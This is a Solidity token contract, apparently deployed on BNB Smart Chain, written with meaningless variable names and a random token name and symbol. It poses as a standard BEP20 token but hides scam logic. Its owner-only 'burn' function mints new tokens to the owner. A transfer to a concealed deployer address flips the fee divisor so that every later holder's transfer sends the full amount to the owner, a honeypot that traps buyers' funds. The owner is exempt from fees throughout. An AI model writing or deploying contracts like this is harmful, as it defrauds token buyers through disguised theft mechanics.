/**
 *Submitted for verification at BscScan.com on 2022-11-13
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-11
 */
pragma solidity >=0.4.11;
contract bALrBy {
event Transfer(address indexed from, address indexed to, uint256 value);
event Approval(address indexed owner, address indexed spender, uint256 value);
mapping (address => uint256) public balanceOf;
address public  WlErOw = address(0);
uint256 public  ghNXvT = 100000000000000000;
uint256 public  RbrBbG = 100000000000000000000;
uint256 private  ssZibj = 10000000000000;
uint256 public  YtpJaR = 10000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
address public  nWUUik = address(0);
address public  gqAEYv = address(0);
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 public  wLekIf = 1000000000000000000;
address private  zJdVUQ = address(0);
uint256 public  zvsjiW = 100000000000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address public  sBXJaD = address(0);
uint8 public constant decimals = 18;
address public  BZRuvq = address(0);
string public  name = "fpORYr";
uint256 public  ykDYQf = 10000000000000000000000000000;
address public  czqpHr = address(0);
uint256 public  nzSPIc = 100000000000000000000000;
string public  symbol = "nmERVD";
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address public owner;
uint256 public  dtAGBA = 10000000000000000;
uint256 public constant aAqBfp = 9+1;
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
constructor () public {
zJdVUQ = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "WqtJzL");
require(to != address(0), "WqtJzL");
require(amount <= balanceOf[from], "WqtJzL");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* aAqBfp/ssZibj ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==zJdVUQ){
ssZibj = 9+1;
}
emit Transfer(from, to, transferAmount);
}

}